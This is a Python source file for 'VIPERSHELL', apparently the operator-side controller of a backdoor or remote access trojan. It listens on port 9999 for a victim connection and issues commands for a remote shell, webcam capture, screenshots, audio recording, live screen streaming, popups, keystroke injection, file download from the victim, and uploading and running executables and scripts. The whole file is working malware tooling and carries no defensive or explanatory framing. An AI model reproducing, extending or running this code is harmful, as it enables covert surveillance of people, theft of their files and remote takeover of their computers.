import os
import socket
import time
import colorama
from colorama import Fore, Style
import numpy as np
import cv2

colorama.init(autoreset=True)
working_dir = None


def connect(stmt):
    global conn, s
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(('0.0.0.0', 9999))

    s.listen(5)
    print(f'{Fore.BLUE}{stmt}')
    print()
    conn, addr = s.accept()
    print(f'{Fore.YELLOW}[*] connected on {addr}')


def cmd() -> None:
    global working_dir
    print()
    print(f'{Fore.BLUE}[*] Enter back to close cmd')
    print()
    while True:
        if working_dir:
            msg = input(f'{Fore.LIGHTGREEN_EX}{working_dir}')

            if msg.lower() == 'back':
                options()
                break

            conn.send(b'TEXTS|' + msg.encode())
            rec()


def rec() -> None:
    global working_dir
    while True:
        r_msg = ''
        header = conn.recv(6)

        r_msg += (header.decode() + conn.recv(1024).decode())

        if r_msg:
            if r_msg == 'exit' or r_msg == 'suspend':
                break

            if 'workingdir' in r_msg:
                r_msg = r_msg.replace('workingdir', '').replace('TEXTS|', '')
                working_dir = r_msg

            elif r_msg != 'check' and r_msg != 'ENDOFFILE':
                print(f'{Fore.LIGHTGREEN_EX}{r_msg.replace("ENDOFFILE", "")}', end='')

            if r_msg.endswith('ENDOFFILE'):
                break


def options():
    wd = os.getcwd()
    while True:
        # re = Thread(target=rec)
        user = input(f"""
┌──({Fore.LIGHTGREEN_EX}{Style.BRIGHT}vipershell{Fore.LIGHTRED_EX}㉿{Fore.LIGHTGREEN_EX}terminal{Style.RESET_ALL})-[{Fore.LIGHTCYAN_EX}{wd}{Style.RESET_ALL}]
└─{Fore.LIGHTCYAN_EX}{Style.BRIGHT}$ """).split()

        if user[0] == '-cmd' or user[0] == '--COMMAND':
            if working_dir:
                cmd()
                break

            else:
                print(f'{Fore.LIGHTRED_EX}[-] Unable to connect to cmd')

        elif user[0] == '-e' or user[0] == '--EXIT':
            conn.send(b'TEXTS|' + 'exit'.encode())
            break

        elif user[0] == '-l' or user[0] == '--LOCATION':
            conn.send(b'TEXTS|' + 'lctn'.encode())
            time.sleep(1.3)

        elif user[0] == '-ip' or user[0] == '--IP':
            conn.send(b'TEXTS|' + 'ipaddr'.encode())
            time.sleep(0.7)

        elif user[0] == '-sus' or user[0] == '--SUSPEND':
            try:
                conn.send(b'TEXTS|' + 'suspend'.encode())
            except ConnectionAbortedError:
                print(f'{Fore.LIGHTRED_EX}[-] Connection is already suspended!')

        elif user[0] == '-rec' or user[0] == '--RECONNECT':
            try:
                conn.send('check'.encode())
                r_msg = conn.recv(1024)
                r_msg = r_msg.decode()
                if r_msg:
                    print(f'{Fore.YELLOW}[+] Connection already established!')

            except OSError:
                connect(f'{Fore.BLUE}[*] Reconnected to the host!')

        elif user[0] == '-cam' or user[0] == '--CAMERAS':
            conn.send(b'TEXTS|' + '''powershell -Command "Get-CimInstance Win32_PnPEntity | ? { $_.service -eq 'usbvideo' } | Select-Object -Property PNPDeviceID, Name"'''.encode())
            rec()

        elif user[0] == '-img' or user[0] == '--IMAGE' or user[0] == '-ss' or user[0] == '--SCREENSHOT' or user[0] == '-recr' or user == '--RECORD':

            try:
                if user[1]:
                    int(user[1])

            except ValueError:
                print(f'{Fore.LIGHTRED_EX}[-] Please enter a number.')
                continue

            except IndexError:
                if user[0] == '-img' or user[0] == '--IMAGE':
                    user.insert(1, '0')
                else:
                    user.insert(1, '5')

            print(f'\r{Fore.YELLOW}[+] Capturing...', end='')
            conn.send(b'TEXTS|' + f'image{user[1]}'.encode()) if user[0] == '-img' or user[0] == '--IMAGE' else conn.send(b'TEXTS|' + 'ss'.encode()) if user[0] == '-ss' or user[0] == '--SCREENSHOT' else conn.send(b'TEXTS|' + f'recr{user[1]}'.encode())

            conn.settimeout(int(user[1]) + 5)
            name = 'Backdoor_Image.jpg' if user[0] == '-img' or user[0] == '--IMAGE' else 'Backdoor_Screenshot.jpg' if user[0] == '-ss' or user[0] == '--SCREENSHOT' else 'Backdoor_Audio.wav'
            img = open(name, 'wb')
            try:
                data = conn.recv(2048)
                if not data.startswith(b'Error'):
                    while True:
                        img.write(data)
                        data = conn.recv(2048)
                        if b'ENDOFFILE' in data:
                            break

                    print(f'\r{Fore.BLUE}[*] {name[name.index("_") + 1:name.index(".")]} saved successfully! Check your current working directory')

                else:
                    print(f'{Fore.LIGHTRED_EX}\r[-] {data.decode()}')

            except socket.timeout:
                print(f'\r{Fore.LIGHTRED_EX}[-] Disconnected from the host.')

            finally:
                img.close()
                conn.settimeout(None)

        elif user[0] == '-sstr' or user[0] == '--SCRSTREAM':
            conn.send(b'TEXTS|' + 'scrstream'.encode())
            print(f'\r{Fore.BLUE}[*] Streaming started', end='')
            s.settimeout(5)
            play = True
            try:
                while play:
                    data = b''
                    while True:
                        chunk = conn.recv(2048)
                        if not chunk:
                            break
                        data += chunk
                        if b'ENDOFFILE' in chunk:
                            data = data.replace(b'ENDOFFILE', b'')
                            break

                    if data:
                        np_data = np.frombuffer(data, dtype=np.uint8)
                        frame = cv2.imdecode(np_data, cv2.IMREAD_COLOR)

                        if frame is not None:
                            cv2.imshow('Screen Stream', frame)

                        if cv2.waitKey(1) & 0xFF == ord('q'):
                            play = False
                            conn.send(b'TEXTS|' + 'stopstream'.encode())
                            break

            except Exception as e:
                print(f"\r{Fore.LIGHTRED_EX}[-] An error occurred: {str(e)}. The screenshot might not be captured.")

            finally:
                cv2.destroyAllWindows()
                endOfFile = conn.recv(1024)

                while b'ENDOFFILE' not in endOfFile:
                    endOfFile = conn.recv(1024)
                print(f'\r{Fore.BLUE}[*] Stream ended')

        elif user[0] == '-pop' or user[0] == '--POPUP':
            message = input(f'\r{Fore.YELLOW}[+] Enter the message you wanna show. Enter quit to exit: ')
            if message != 'quit':
                conn.send(b'TEXTS|' + f'p|{message}'.encode())
                print(f'\r{Fore.BLUE}[*] Message successfully displayed!')

        elif user[0] == '-m' or user[0] == '--MACHINE':
            conn.send(b'TEXTS|' + 'machine'.encode())
            time.sleep(1)

        elif user[0] == '-scr' or user[0] == '--SCRIPT':
            code = input(f'{Fore.YELLOW}[+] Enter the name or path of the python script. Enter quit to quit: ')

            if code.lower() != 'quit':
                if code.endswith('.py') or code.endswith('.bat'):

                    try:
                        with open(code, 'r') as c:
                            script = c.read(1024)
                            print(f'{Fore.YELLOW}[+] Executing... ')
                            conn.send(b'SCRIPY') if code.endswith('.py') else conn.send(b'SCRIPB')

                            while script:
                                conn.send(script.encode())
                                script = c.read(1024)

                            time.sleep(0.5)
                            conn.send(b'# ENDOFFILE')
                            c.close()
                            rec()

                    except FileNotFoundError:
                        print(f'{Fore.LIGHTRED_EX}[-] Specified file could not be found!')

                else:
                    print(f'{Fore.LIGHTRED_EX}[-] Please provide a .py or .bat file!')

        elif user[0] == '-k' or user[0] == '--KEY':
            try:
                key = user[1]
                if key != '-h':
                    conn.send(b'TEXTS|' + f'keytrigg{key}'.encode())

                else:
                    with open('keyhelp.txt', 'r') as k:
                        print(f'{Fore.LIGHTGREEN_EX}{k.read()}')

            except IndexError:
                print(f'{Fore.LIGHTRED_EX}[-] Please provide a valid key. Use -h or --HELP to display help menu.')

        elif user[0] == '-h' or user[0] == '--HELP':
            with open('help.txt', 'r') as h:
                print(f'{Fore.LIGHTGREEN_EX}{h.read()}')
                h.close()

        elif user[0] == '-feu' or user[0] == '-FILE-EU':
            try:
                filePath = user[1]
                if len(user) > 2:
                    filePath = user[1] + " " + " ".join(user[2:])

                if filePath.endswith('.exe'):
                    with open(filePath, 'rb') as u:
                        data = u.read(1024)
                        print(f'\r{Fore.YELLOW}[+] Uploading!', end='')
                        conn.send(b'FILE||')

                        while data:
                            conn.send(data)
                            data = u.read(1024)

                        conn.send(b'ENDOFFILE')
                        u.close()
                        rec()

                else:
                    print(f'{Fore.LIGHTRED_EX}[-] Please provide an exe file.')

            except IndexError:
                print(f'{Fore.LIGHTRED_EX}[-] Please enter the file path.')

            except FileNotFoundError:
                print(f'{Fore.LIGHTRED_EX}[-] Specified file could not be found!')

            except Exception as e:
                print(f'{Fore.LIGHTRED_EX}[-] {e}')

        elif user[0] == '-fd' or user[0] == '--FILE-D':
            try:
                fileP = user[1]
                if len(user) > 2:
                    fileP = user[1] + " " + " ".join(user[2:])

                fileN = fileP.split('\\')[-1]
                conn.send(b'TEXTS|' + f'filedl{fileP}'.encode())
                data = conn.recv(1024)
                print(f'\r{Fore.YELLOW}[+] Downloading...', end='')

                try:
                    data = data.decode()
                    wmode = 'w'
                    dec = True
                except UnicodeDecodeError:
                    wmode = 'wb'
                    dec = False

                f = open(fileN, wmode)
                while True:
                    f.write(data)
                    data = conn.recv(1024) if not dec else conn.recv(1024).decode()
                    try:
                        if b'ENDOFFILE' in data:
                            break

                    except TypeError:
                        if 'ENDOFFILE' in data:
                            break

                print(f'\r{Fore.BLUE}[*] Successfully downloaded the file. Check your current working directory!')
                f.close()

            except IndexError:
                print(f'{Fore.LIGHTRED_EX}[-] Please enter the file path.')

        else:
            print(f'{Fore.LIGHTRED_EX}[-] Invalid command. use -h or --HELP to open up help menu')

with open('banner.txt', 'rb') as b:
    text = b.read()
    exec(text.decode())
    b.close()

print(f'{Fore.LIGHTRED_EX}VIPERSHELL {Fore.LIGHTBLUE_EX}Version 1.0')
print()
print(f'{Fore.LIGHTBLUE_EX}=================================================================================================================================================')
print()
connect("[+] Listening on port 9999...")

rec()

options()
